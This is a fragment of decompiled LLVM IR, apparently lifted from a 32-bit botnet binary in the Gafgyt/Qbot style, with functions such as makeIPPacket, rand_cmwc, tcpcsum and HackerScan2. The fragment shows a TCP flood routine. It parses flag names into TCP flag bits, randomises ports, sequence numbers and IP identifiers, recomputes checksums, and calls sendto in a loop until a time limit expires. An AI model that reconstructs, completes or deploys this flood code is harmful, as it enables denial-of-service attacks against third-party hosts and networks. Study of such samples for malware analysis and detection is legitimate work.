  %v0_805d9e9 = call i32 @makeIPPacket()
  store i32 %v0_805d9e9, i32* %eax.global-to-local, align 4
  %v2_805d9ee = call i32 @rand_cmwc(i32 %v1_805d9ab)
  %sext = mul i32 %v2_805d9ee, 65536
  %v1_805d9f3 = sdiv i32 %sext, 65536
  store i32 %v1_805d9f3, i32* %edx.global-to-local, align 4
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v1_805d9f8 = trunc i32 %v1_805d9f3 to i16
  store i16 %v1_805d9f8, i16* %v5_805d9ae, align 4
  %v2_805d9fb = call i32 @rand_cmwc(i32 %v1_805d9ab)
  %v2_805da05 = add i32 %v2_805d993, 24
  %v3_805da05 = inttoptr i32 %v2_805da05 to i32*
  store i32 %v2_805d9fb, i32* %v3_805da05, align 8
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v1_805da0b = add i32 %v2_805d993, 28
  %v2_805da0b = inttoptr i32 %v1_805da0b to i32*
  store i32 0, i32* %v2_805da0b, align 4
  store i32 %v1_805d9ab, i32* @edx, align 4
  %v1_805da15 = add i32 %v2_805d993, 32
  %v2_805da15 = inttoptr i32 %v1_805da15 to i8*
  %v3_805da15 = load i8, i8* %v2_805da15, align 16
  %v1_805da19 = urem i8 %v3_805da15, 16
  %v1_805da1c = or i8 %v1_805da19, 80
  store i8 %v1_805da1c, i8* %v2_805da15, align 16
  store i32 %arg5, i32* @eax, align 4
  %v0_805da25 = load i32, i32* @esp, align 4
  %v1_805da25 = add i32 %v0_805da25, 4
  %v2_805da25 = inttoptr i32 %v1_805da25 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e5ed.1492 to i32), i32* %v2_805da25, align 4
  %v0_805da2d = load i32, i32* @eax, align 4
  %v1_805da2d = load i32, i32* @esp, align 4
  %v2_805da2d = inttoptr i32 %v1_805da2d to i32*
  store i32 %v0_805da2d, i32* %v2_805da2d, align 4
  %tmp64 = inttoptr i32 %v1_805d9ab to i8*
  %v4_805da30 = call i32 @__GI_strcoll(i8* %tmp64, i32 %tmp30)
  store i32 %v4_805da30, i32* %eax.global-to-local, align 4
  %v1_805da35 = icmp eq i32 %v4_805da30, 0
  %v1_805da37 = icmp eq i1 %v1_805da35, false
  br i1 %v1_805da37, label %dec_label_pc_805da7f, label %dec_label_pc_805da39

dec_label_pc_805da39:                             ; preds = %dec_label_pc_805d96c
  store i32 %v1_805d9ab, i32* %edx.global-to-local, align 4
  %v1_805da3c = add i32 %v2_805d993, 33
  %v2_805da3c = inttoptr i32 %v1_805da3c to i8*
  %v3_805da3c = load i8, i8* %v2_805da3c, align 1
  %v4_805da3c = zext i8 %v3_805da3c to i32
  %v1_805da40 = or i32 %v4_805da3c, 2
  %v3_805da40 = trunc i32 %v1_805da40 to i8
  store i32 %v1_805da40, i32* %eax.global-to-local, align 4
  store i8 %v3_805da40, i8* %v2_805da3c, align 1
  store i32 %v1_805d9ab, i32* %edx.global-to-local, align 4
  %v3_805da49 = load i8, i8* %v2_805da3c, align 1
  %v4_805da49 = zext i8 %v3_805da49 to i32
  %v1_805da4d = or i32 %v4_805da49, 4
  %v3_805da4d = trunc i32 %v1_805da4d to i8
  store i32 %v1_805da4d, i32* %eax.global-to-local, align 4
  store i8 %v3_805da4d, i8* %v2_805da3c, align 1
  store i32 %v1_805d9ab, i32* %edx.global-to-local, align 4
  %v3_805da56 = load i8, i8* %v2_805da3c, align 1
  %v4_805da56 = zext i8 %v3_805da56 to i32
  %v1_805da5a = or i32 %v4_805da56, 1
  %v3_805da5a = trunc i32 %v1_805da5a to i8
  store i32 %v1_805da5a, i32* %eax.global-to-local, align 4
  store i8 %v3_805da5a, i8* %v2_805da3c, align 1
  store i32 %v1_805d9ab, i32* %edx.global-to-local, align 4
  %v3_805da63 = load i8, i8* %v2_805da3c, align 1
  %v4_805da63 = zext i8 %v3_805da63 to i32
  %v1_805da67 = or i32 %v4_805da63, 16
  %v3_805da67 = trunc i32 %v1_805da67 to i8
  store i32 %v1_805da67, i32* %eax.global-to-local, align 4
  store i8 %v3_805da67, i8* %v2_805da3c, align 1
  store i32 %v1_805d9ab, i32* %edx.global-to-local, align 4
  %v3_805da70 = load i8, i8* %v2_805da3c, align 1
  %v4_805da70 = zext i8 %v3_805da70 to i32
  %v1_805da74 = or i32 %v4_805da70, 8
  %v3_805da74 = trunc i32 %v1_805da74 to i8
  store i32 %v1_805da74, i32* %eax.global-to-local, align 4
  store i8 %v3_805da74, i8* %v2_805da3c, align 1
  br label %dec_label_pc_805db9c

dec_label_pc_805da7f:                             ; preds = %dec_label_pc_805d96c
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v0_805da82 = load i32, i32* @esp, align 4
  %v1_805da82 = add i32 %v0_805da82, 4
  %v2_805da82 = inttoptr i32 %v1_805da82 to i32*
  store i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32), i32* %v2_805da82, align 4
  %v0_805da8a = load i32, i32* %eax.global-to-local, align 4
  %v1_805da8a = load i32, i32* @esp, align 4
  %v2_805da8a = inttoptr i32 %v1_805da8a to i32*
  store i32 %v0_805da8a, i32* %v2_805da8a, align 4
  %v3_805da8d = call i32 @__GI_strtok(i32 %v1_805d9ab, i32 %tmp30)
  store i32 %v3_805da8d, i32* %eax.global-to-local, align 4
  %v4_805db9218 = icmp eq i32 %v3_805da8d, 0
  %v1_805db9625 = icmp eq i1 %v4_805db9218, false
  br i1 %v1_805db9625, label %dec_label_pc_805da9a.lr.ph, label %dec_label_pc_805db9c

dec_label_pc_805da9a.lr.ph:                       ; preds = %dec_label_pc_805da7f
  %v1_805db52 = add i32 %v2_805d993, 33
  %v2_805db52 = inttoptr i32 %v1_805db52 to i8*
  br label %dec_label_pc_805da9a

dec_label_pc_805da9a:                             ; preds = %dec_label_pc_805da9a.lr.ph, %dec_label_pc_805db7b
  %storemerge1526 = phi i32 [ %v3_805da8d, %dec_label_pc_805da9a.lr.ph ], [ %v2_805db8a, %dec_label_pc_805db7b ]
  store i32 %storemerge1526, i32* @eax, align 4
  %v0_805da9d = load i32, i32* @esp, align 4
  %v1_805da9d = add i32 %v0_805da9d, 4
  %v2_805da9d = inttoptr i32 %v1_805da9d to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e5f3.1494 to i32), i32* %v2_805da9d, align 4
  %v0_805daa5 = load i32, i32* @eax, align 4
  %v1_805daa5 = load i32, i32* @esp, align 4
  %v2_805daa5 = inttoptr i32 %v1_805daa5 to i32*
  store i32 %v0_805daa5, i32* %v2_805daa5, align 4
  %v2_805daa8 = inttoptr i32 %storemerge1526 to i8*
  %v3_805daa8 = call i32 @__GI_strcoll(i8* %v2_805daa8, i32 %v0_805d845)
  store i32 %v3_805daa8, i32* %eax.global-to-local, align 4
  %v1_805daad = icmp eq i32 %v3_805daa8, 0
  %v1_805daaf = icmp eq i1 %v1_805daad, false
  br i1 %v1_805daaf, label %dec_label_pc_805dac3, label %dec_label_pc_805dab1

dec_label_pc_805dab1:                             ; preds = %dec_label_pc_805da9a
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v3_805dab4 = load i8, i8* %v2_805db52, align 1
  %v4_805dab4 = zext i8 %v3_805dab4 to i32
  %v1_805dab8 = or i32 %v4_805dab4, 2
  %v3_805dab8 = trunc i32 %v1_805dab8 to i8
  store i32 %v1_805dab8, i32* @edx, align 4
  store i8 %v3_805dab8, i8* %v2_805db52, align 1
  br label %dec_label_pc_805db7b

dec_label_pc_805dac3:                             ; preds = %dec_label_pc_805da9a
  store i32 %storemerge1526, i32* @eax, align 4
  %v0_805dac6 = load i32, i32* @esp, align 4
  %v1_805dac6 = add i32 %v0_805dac6, 4
  %v2_805dac6 = inttoptr i32 %v1_805dac6 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e5f7.1495 to i32), i32* %v2_805dac6, align 4
  %v0_805dace = load i32, i32* @eax, align 4
  %v1_805dace = load i32, i32* @esp, align 4
  %v2_805dace = inttoptr i32 %v1_805dace to i32*
  store i32 %v0_805dace, i32* %v2_805dace, align 4
  %v3_805dad1 = call i32 @__GI_strcoll(i8* %v2_805daa8, i32 %v0_805d845)
  store i32 %v3_805dad1, i32* %eax.global-to-local, align 4
  %v1_805dad6 = icmp eq i32 %v3_805dad1, 0
  %v1_805dad8 = icmp eq i1 %v1_805dad6, false
  br i1 %v1_805dad8, label %dec_label_pc_805daec, label %dec_label_pc_805dada

dec_label_pc_805dada:                             ; preds = %dec_label_pc_805dac3
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v3_805dadd = load i8, i8* %v2_805db52, align 1
  %v4_805dadd = zext i8 %v3_805dadd to i32
  %v1_805dae1 = or i32 %v4_805dadd, 4
  %v3_805dae1 = trunc i32 %v1_805dae1 to i8
  store i32 %v1_805dae1, i32* @edx, align 4
  store i8 %v3_805dae1, i8* %v2_805db52, align 1
  br label %dec_label_pc_805db7b

dec_label_pc_805daec:                             ; preds = %dec_label_pc_805dac3
  store i32 %storemerge1526, i32* @eax, align 4
  %v0_805daef = load i32, i32* @esp, align 4
  %v1_805daef = add i32 %v0_805daef, 4
  %v2_805daef = inttoptr i32 %v1_805daef to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e5fb.1496 to i32), i32* %v2_805daef, align 4
  %v0_805daf7 = load i32, i32* @eax, align 4
  %v1_805daf7 = load i32, i32* @esp, align 4
  %v2_805daf7 = inttoptr i32 %v1_805daf7 to i32*
  store i32 %v0_805daf7, i32* %v2_805daf7, align 4
  %v3_805dafa = call i32 @__GI_strcoll(i8* %v2_805daa8, i32 %v0_805d845)
  store i32 %v3_805dafa, i32* %eax.global-to-local, align 4
  %v1_805daff = icmp eq i32 %v3_805dafa, 0
  %v1_805db01 = icmp eq i1 %v1_805daff, false
  br i1 %v1_805db01, label %dec_label_pc_805db12, label %dec_label_pc_805db03

dec_label_pc_805db03:                             ; preds = %dec_label_pc_805daec
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v3_805db06 = load i8, i8* %v2_805db52, align 1
  %v4_805db06 = zext i8 %v3_805db06 to i32
  %v1_805db0a = or i32 %v4_805db06, 1
  %v3_805db0a = trunc i32 %v1_805db0a to i8
  store i32 %v1_805db0a, i32* @edx, align 4
  store i8 %v3_805db0a, i8* %v2_805db52, align 1
  br label %dec_label_pc_805db7b

dec_label_pc_805db12:                             ; preds = %dec_label_pc_805daec
  store i32 %storemerge1526, i32* @eax, align 4
  %v0_805db15 = load i32, i32* @esp, align 4
  %v1_805db15 = add i32 %v0_805db15, 4
  %v2_805db15 = inttoptr i32 %v1_805db15 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e5ff.1497 to i32), i32* %v2_805db15, align 4
  %v0_805db1d = load i32, i32* @eax, align 4
  %v1_805db1d = load i32, i32* @esp, align 4
  %v2_805db1d = inttoptr i32 %v1_805db1d to i32*
  store i32 %v0_805db1d, i32* %v2_805db1d, align 4
  %v3_805db20 = call i32 @__GI_strcoll(i8* %v2_805daa8, i32 %v0_805d845)
  store i32 %v3_805db20, i32* %eax.global-to-local, align 4
  %v1_805db25 = icmp eq i32 %v3_805db20, 0
  %v1_805db27 = icmp eq i1 %v1_805db25, false
  br i1 %v1_805db27, label %dec_label_pc_805db38, label %dec_label_pc_805db29

dec_label_pc_805db29:                             ; preds = %dec_label_pc_805db12
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v3_805db2c = load i8, i8* %v2_805db52, align 1
  %v4_805db2c = zext i8 %v3_805db2c to i32
  %v1_805db30 = or i32 %v4_805db2c, 16
  %v3_805db30 = trunc i32 %v1_805db30 to i8
  store i32 %v1_805db30, i32* @edx, align 4
  store i8 %v3_805db30, i8* %v2_805db52, align 1
  br label %dec_label_pc_805db7b

dec_label_pc_805db38:                             ; preds = %dec_label_pc_805db12
  store i32 %storemerge1526, i32* @eax, align 4
  %v0_805db3b = load i32, i32* @esp, align 4
  %v1_805db3b = add i32 %v0_805db3b, 4
  %v2_805db3b = inttoptr i32 %v1_805db3b to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_806e603.1498 to i32), i32* %v2_805db3b, align 4
  %v0_805db43 = load i32, i32* @eax, align 4
  %v1_805db43 = load i32, i32* @esp, align 4
  %v2_805db43 = inttoptr i32 %v1_805db43 to i32*
  store i32 %v0_805db43, i32* %v2_805db43, align 4
  %v3_805db46 = call i32 @__GI_strcoll(i8* %v2_805daa8, i32 %v0_805d845)
  store i32 %v3_805db46, i32* %eax.global-to-local, align 4
  %v1_805db4b = icmp eq i32 %v3_805db46, 0
  %v1_805db4d = icmp eq i1 %v1_805db4b, false
  br i1 %v1_805db4d, label %dec_label_pc_805db5e, label %dec_label_pc_805db4f

dec_label_pc_805db4f:                             ; preds = %dec_label_pc_805db38
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v3_805db52 = load i8, i8* %v2_805db52, align 1
  %v4_805db52 = zext i8 %v3_805db52 to i32
  %v1_805db56 = or i32 %v4_805db52, 8
  %v3_805db56 = trunc i32 %v1_805db56 to i8
  store i32 %v1_805db56, i32* @edx, align 4
  store i8 %v3_805db56, i8* %v2_805db52, align 1
  br label %dec_label_pc_805db7b

dec_label_pc_805db5e:                             ; preds = %dec_label_pc_805db38
  %v0_805db5e = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805db5e = ptrtoint i8* %v0_805db5e to i32
  store i32 %v1_805db5e, i32* %edx.global-to-local, align 4
  store i32 %storemerge1526, i32* %eax.global-to-local, align 4
  %v1_805db67 = load i32, i32* @esp, align 4
  %v2_805db67 = add i32 %v1_805db67, 8
  %v3_805db67 = inttoptr i32 %v2_805db67 to i32*
  store i32 %storemerge1526, i32* %v3_805db67, align 4
  %v0_805db6b = load i32, i32* @esp, align 4
  %v1_805db6b = add i32 %v0_805db6b, 4
  %v2_805db6b = inttoptr i32 %v1_805db6b to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_806e607.1499 to i32), i32* %v2_805db6b, align 4
  %v0_805db73 = load i32, i32* %edx.global-to-local, align 4
  %v1_805db73 = load i32, i32* @esp, align 4
  %v2_805db73 = inttoptr i32 %v1_805db73 to i32*
  store i32 %v0_805db73, i32* %v2_805db73, align 4
  %v2_805db76 = call i32 @HackerPrint(i32 %storemerge1526, i32 %v0_805d845)
  store i32 %v2_805db76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805db7b

dec_label_pc_805db7b:                             ; preds = %dec_label_pc_805db4f, %dec_label_pc_805db29, %dec_label_pc_805db03, %dec_label_pc_805dada, %dec_label_pc_805dab1, %dec_label_pc_805db5e
  %v0_805db7b = load i32, i32* @esp, align 4
  %v1_805db7b = add i32 %v0_805db7b, 4
  %v2_805db7b = inttoptr i32 %v1_805db7b to i32*
  store i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32), i32* %v2_805db7b, align 4
  %v0_805db83 = load i32, i32* @esp, align 4
  %v1_805db83 = inttoptr i32 %v0_805db83 to i32*
  store i32 0, i32* %v1_805db83, align 4
  %v2_805db8a = call i32 @__GI_strtok(i32 %storemerge1526, i32 %v0_805d845)
  store i32 %v2_805db8a, i32* %eax.global-to-local, align 4
  %v4_805db92 = icmp eq i32 %v2_805db8a, 0
  %v1_805db96 = icmp eq i1 %v4_805db92, false
  br i1 %v1_805db96, label %dec_label_pc_805da9a, label %dec_label_pc_805db9c

dec_label_pc_805db9c:                             ; preds = %dec_label_pc_805db7b, %dec_label_pc_805da7f, %dec_label_pc_805da39
  %stack_var_-12.0 = phi i32 [ %tmp33, %dec_label_pc_805da39 ], [ %v3_805da8d, %dec_label_pc_805da7f ], [ %v2_805db8a, %dec_label_pc_805db7b ]
  %v1_805db9c = call i32 @rand_cmwc(i32 %stack_var_-12.0)
  %sext4 = mul i32 %v1_805db9c, 65536
  %v1_805dba1 = sdiv i32 %sext4, 65536
  store i32 %v1_805dba1, i32* %edx.global-to-local, align 4
  %v1_805dba6 = trunc i32 %v1_805dba1 to i16
  %v3_805dba6 = add i32 %v2_805d993, 34
  %v4_805dba6 = inttoptr i32 %v3_805dba6 to i16*
  store i16 %v1_805dba6, i16* %v4_805dba6, align 2
  %v1_805dbad = add i32 %v2_805d993, 36
  %v2_805dbad = inttoptr i32 %v1_805dbad to i16*
  store i16 0, i16* %v2_805dbad, align 4
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  %v1_805dbb6 = add i32 %v2_805d993, 38
  %v2_805dbb6 = inttoptr i32 %v1_805dbb6 to i16*
  store i16 0, i16* %v2_805dbb6, align 2
  br i1 %v1_805d85e, label %dec_label_pc_805dbcd, label %dec_label_pc_805dbc2

dec_label_pc_805dbc2:                             ; preds = %dec_label_pc_805db9c
  %v1_805dbc2 = call i32 @rand_cmwc(i32 %stack_var_-12.0)
  br label %dec_label_pc_805dbdf

dec_label_pc_805dbcd:                             ; preds = %dec_label_pc_805db9c
  %v1_805dbd0 = urem i32 %arg2, 65536
  store i32 %v1_805dbd0, i32* %eax.global-to-local, align 4
  %v1_805dbd3 = load i32, i32* @esp, align 4
  %v2_805dbd3 = inttoptr i32 %v1_805dbd3 to i32*
  store i32 %v1_805dbd0, i32* %v2_805dbd3, align 4
  %v3_805dbd6 = call i32 @__GI_htons(i16 %tmp32)
  store i32 %v3_805dbd6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbdf

dec_label_pc_805dbdf:                             ; preds = %dec_label_pc_805dbc2, %dec_label_pc_805dbcd
  %storemerge14 = phi i32 [ %v1_805dbc2, %dec_label_pc_805dbc2 ], [ %v3_805dbd6, %dec_label_pc_805dbcd ]
  %storemerge = trunc i32 %storemerge14 to i16
  %v4_805dbe2 = urem i32 %storemerge14, 65536
  store i32 %v4_805dbe2, i32* %edx.global-to-local, align 4
  %v3_805dbe6 = add i32 %v2_805d993, 22
  %v4_805dbe6 = inttoptr i32 %v3_805dbe6 to i16*
  store i16 %storemerge, i16* %v4_805dbe6, align 2
  %v1_805dbed = load i32, i32* @esp, align 4
  %v2_805dbed = add i32 %v1_805dbed, 4
  %v3_805dbed = inttoptr i32 %v2_805dbed to i32*
  store i32 %v1_805d9ab, i32* %v3_805dbed, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dbf4 = load i32, i32* @esp, align 4
  %v2_805dbf4 = inttoptr i32 %v1_805dbf4 to i32*
  store i32 %v2_805d993, i32* %v2_805dbf4, align 4
  %v0_805dbf7 = call i32 @tcpcsum()
  %sext5 = mul i32 %v0_805dbf7, 65536
  %v1_805dbfc = sdiv i32 %sext5, 65536
  store i32 %v1_805dbfc, i32* %edx.global-to-local, align 4
  %v1_805dc01 = trunc i32 %v1_805dbfc to i16
  store i16 %v1_805dc01, i16* %v2_805dbad, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dc08 = or i32 %v2_805d993, 2
  %v2_805dc08 = inttoptr i32 %v1_805dc08 to i16*
  %v3_805dc08 = load i16, i16* %v2_805dc08, align 2
  %v4_805dc08 = zext i16 %v3_805dc08 to i32
  store i32 %v4_805dc08, i32* %edx.global-to-local, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dc12 = load i32, i32* @esp, align 4
  %v2_805dc12 = add i32 %v1_805dc12, 4
  %v3_805dc12 = inttoptr i32 %v2_805dc12 to i32*
  store i32 %v4_805dc08, i32* %v3_805dc12, align 4
  %v0_805dc16 = load i32, i32* %eax.global-to-local, align 4
  %v1_805dc16 = load i32, i32* @esp, align 4
  %v2_805dc16 = inttoptr i32 %v1_805dc16 to i32*
  store i32 %v0_805dc16, i32* %v2_805dc16, align 4
  %sext16 = mul i32 %storemerge14, 65536
  %v1_805dc19 = sdiv i32 %sext16, 65536
  %v3_805dc19 = inttoptr i32 %v1_805dc19 to i16*
  %v4_805dc19 = call i32 @csum(i16* %v3_805dc19, i32 ptrtoint (i32* @0 to i32))
  %sext6 = mul i32 %v4_805dc19, 65536
  %v1_805dc1e = sdiv i32 %sext6, 65536
  store i32 %v1_805dc1e, i32* %edx.global-to-local, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dc23 = trunc i32 %v1_805dc1e to i16
  %v3_805dc23 = or i32 %v2_805d993, 10
  %v4_805dc23 = inttoptr i32 %v3_805dc23 to i16*
  store i16 %v1_805dc23, i16* %v4_805dc23, align 2
  %v0_805dc27 = load i32, i32* @esp, align 4
  %v1_805dc27 = inttoptr i32 %v0_805dc27 to i32*
  store i32 0, i32* %v1_805dc27, align 4
  %v2_805dc2e = inttoptr i32 %v1_805dc19 to i32*
  %v3_805dc2e = call i32 @__GI_time(i32* %v2_805dc2e)
  %v5_805dc33 = add i32 %v3_805dc2e, %arg3
  store i32 %v5_805dc33, i32* %eax.global-to-local, align 4
  %v2_805dc88 = or i32 %v2_805d993, 12
  %v3_805dc88 = inttoptr i32 %v2_805dc88 to i32*
  %v3_805dc95 = or i32 %v2_805d993, 4
  %v4_805dc95 = inttoptr i32 %v3_805dc95 to i16*
  br label %dec_label_pc_805dc40

dec_label_pc_805dc40:                             ; preds = %dec_label_pc_805dd01, %dec_label_pc_805dd1e, %dec_label_pc_805dbdf
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_805dbdf ], [ %v4_805dd1e, %dec_label_pc_805dd1e ], [ 0, %dec_label_pc_805dd01 ]
  store i32 %v2_805d993, i32* %edx.global-to-local, align 4
  %v0_805dc46 = load i32, i32* @esp, align 4
  %v1_805dc46 = add i32 %v0_805dc46, 20
  %v2_805dc46 = inttoptr i32 %v1_805dc46 to i32*
  store i32 16, i32* %v2_805dc46, align 4
  %v1_805dc4e = load i32, i32* @esp, align 4
  %v2_805dc4e = add i32 %v1_805dc4e, 16
  %v3_805dc4e = inttoptr i32 %v2_805dc4e to i32*
  store i32 %v2_805d87d, i32* %v3_805dc4e, align 4
  %v0_805dc52 = load i32, i32* @esp, align 4
  %v1_805dc52 = add i32 %v0_805dc52, 12
  %v2_805dc52 = inttoptr i32 %v1_805dc52 to i32*
  store i32 0, i32* %v2_805dc52, align 4
  %v1_805dc5d = load i32, i32* @esp, align 4
  %v2_805dc5d = add i32 %v1_805dc5d, 8
  %v3_805dc5d = inttoptr i32 %v2_805dc5d to i32*
  store i32 %v1_805d96f, i32* %v3_805dc5d, align 4
  %v0_805dc61 = load i32, i32* %edx.global-to-local, align 4
  %v1_805dc61 = load i32, i32* @esp, align 4
  %v2_805dc61 = add i32 %v1_805dc61, 4
  %v3_805dc61 = inttoptr i32 %v2_805dc61 to i32*
  store i32 %v0_805dc61, i32* %v3_805dc61, align 4
  store i32 %v5_805d8d0, i32* %eax.global-to-local, align 4
  %v1_805dc68 = load i32, i32* @esp, align 4
  %v2_805dc68 = inttoptr i32 %v1_805dc68 to i32*
  store i32 %v5_805d8d0, i32* %v2_805dc68, align 4
  %v1_805dc6b = load i32, i32* %stack_var_-56, align 4
  %v2_805dc6b = load i32, i32* %stack_var_-52, align 4
  %v3_805dc6b = load i32, i32* %stack_var_-48, align 4
  %v4_805dc6b = load i32, i32* %stack_var_-44, align 4
  %v6_805dc6b = call i32 @__libc_sendto(i32 %stack_var_-60.0, i32 %v1_805dc6b, i32 %v2_805dc6b, i32 %v3_805dc6b, i32 %v4_805dc6b, i32 ptrtoint (i32* @0 to i32))
  store i32 %storemerge12, i32* %eax.global-to-local, align 4
  %v1_805dc73 = load i32, i32* @esp, align 4
  %v2_805dc73 = inttoptr i32 %v1_805dc73 to i32*
  store i32 %storemerge12, i32* %v2_805dc73, align 4
  %v1_805dc76 = load i32, i32* %stack_var_-56, align 4
  %v2_805dc76 = call i32 @HackerScan2(i32 %stack_var_-60.0, i32 %v1_805dc76)
  store i32 %v2_805dc76, i32* %eax.global-to-local, align 4
  %v1_805dc7b = load i32, i32* @esp, align 4
  %v2_805dc7b = inttoptr i32 %v1_805dc7b to i32*
  store i32 %v2_805dc76, i32* %v2_805dc7b, align 4
  %v0_805dc7e = call i32 @__GI_htonl()
  store i32 %v0_805dc7e, i32* %edx.global-to-local, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  store i32 %v0_805dc7e, i32* %v3_805dc88, align 4
  %v1_805dc8b = call i32 @rand_cmwc(i32 %stack_var_-60.0)
  %sext7 = mul i32 %v1_805dc8b, 65536
  %v1_805dc90 = sdiv i32 %sext7, 65536
  store i32 %v1_805dc90, i32* %edx.global-to-local, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dc95 = trunc i32 %v1_805dc90 to i16
  store i16 %v1_805dc95, i16* %v4_805dc95, align 4
  %v1_805dc99 = call i32 @rand_cmwc(i32 %stack_var_-60.0)
  store i32 %v1_805dc99, i32* %edx.global-to-local, align 4
  store i32 %v1_805d9ab, i32* %eax.global-to-local, align 4
  store i32 %v1_805dc99, i32* %v3_805da05, align 8
  %v1_805dca6 = call i32 @rand_cmwc(i32 %stack_var_-60.0)
  %sext8 = mul i32 %v1_805dca6, 65536
  %v1_805dcab = sdiv i32 %sext8, 65536
  store i32 %v1_805dcab, i32* %edx.global-to-local, align 4
  %v1_805dcb0 = trunc i32 %v1_805dcab to i16
  store i16 %v1_805dcb0, i16* %v5_805d9ae, align 4
  store i16 0, i16* %v2_805dbad, align 4
  %v1_805dcbf = load i32, i32* @esp, align 4
  %v2_805dcbf = add i32 %v1_805dcbf, 4
  %v3_805dcbf = inttoptr i32 %v2_805dcbf to i32*
  store i32 %v1_805d9ab, i32* %v3_805dcbf, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dcc6 = load i32, i32* @esp, align 4
  %v2_805dcc6 = inttoptr i32 %v1_805dcc6 to i32*
  store i32 %v2_805d993, i32* %v2_805dcc6, align 4
  %v0_805dcc9 = call i32 @tcpcsum()
  %sext9 = mul i32 %v0_805dcc9, 65536
  %v1_805dcce = sdiv i32 %sext9, 65536
  store i32 %v1_805dcce, i32* %edx.global-to-local, align 4
  %v1_805dcd3 = trunc i32 %v1_805dcce to i16
  store i16 %v1_805dcd3, i16* %v2_805dbad, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v3_805dcda = load i16, i16* %v2_805dc08, align 2
  %v4_805dcda = zext i16 %v3_805dcda to i32
  store i32 %v4_805dcda, i32* %edx.global-to-local, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dce4 = load i32, i32* @esp, align 4
  %v2_805dce4 = add i32 %v1_805dce4, 4
  %v3_805dce4 = inttoptr i32 %v2_805dce4 to i32*
  store i32 %v4_805dcda, i32* %v3_805dce4, align 4
  %v0_805dce8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805dce8 = load i32, i32* @esp, align 4
  %v2_805dce8 = inttoptr i32 %v1_805dce8 to i32*
  store i32 %v0_805dce8, i32* %v2_805dce8, align 4
  %v1_805dceb = load i32, i32* %stack_var_-56, align 4
  %v2_805dceb = inttoptr i32 %stack_var_-60.0 to i16*
  %v3_805dceb = call i32 @csum(i16* %v2_805dceb, i32 %v1_805dceb)
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805dcf5 = trunc i32 %v3_805dceb to i16
  store i16 %v1_805dcf5, i16* %v4_805dc23, align 2
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v15_805dcfc = icmp eq i32 %stack_var_-60.0, %arg7
  %v1_805dcff = icmp eq i1 %v15_805dcfc, false
  br i1 %v1_805dcff, label %dec_label_pc_805dd1e, label %dec_label_pc_805dd01

dec_label_pc_805dd01:                             ; preds = %dec_label_pc_805dc40
  %v0_805dd01 = load i32, i32* @esp, align 4
  %v1_805dd01 = inttoptr i32 %v0_805dd01 to i32*
  store i32 0, i32* %v1_805dd01, align 4
  %v1_805dd08 = inttoptr i32 %stack_var_-60.0 to i32*
  %v2_805dd08 = call i32 @__GI_time(i32* %v1_805dd08)
  store i32 %v2_805dd08, i32* %eax.global-to-local, align 4
  %v8_805dd10 = icmp sgt i32 %v2_805dd08, %v5_805dc33
  br i1 %v8_805dd10, label %dec_label_pc_805dd27, label %dec_label_pc_805dc40

dec_label_pc_805dd1e:                             ; preds = %dec_label_pc_805dc40
  %v4_805dd1e = add i32 %stack_var_-60.0, 1
  br label %dec_label_pc_805dc40

dec_label_pc_805dd27:                             ; preds = %dec_label_pc_805dd01, %dec_label_pc_805d87d, %dec_label_pc_805d92d, %dec_label_pc_805d8de
  %v0_805dd2e = phi i32 [ %v5_805d88d, %dec_label_pc_805d87d ], [ %v4_805d93d, %dec_label_pc_805d92d ], [ %v4_805d8ee, %dec_label_pc_805d8de ], [ %v2_805dd08, %dec_label_pc_805dd01 ]
  ret i32 %v0_805dd2e

; uselistorder directives
  uselistorder i32 %v1_805dcce, { 1, 0 }
  uselistorder i32 %v1_805dcab, { 1, 0 }
  uselistorder i32 %v1_805dc90, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %v1_805dc1e, { 1, 0 }
  uselistorder i32 %v1_805dc19, { 1, 0 }
  uselistorder i32 %v1_805dbfc, { 1, 0 }
  uselistorder i32 %v1_805dbd0, { 1, 0 }
  uselistorder i32 %v1_805dba1, { 1, 0 }
  uselistorder i32 %v2_805db8a, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge1526, { 9, 8, 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_805db52, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_805da3c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v1_805d9f3, { 1, 0 }
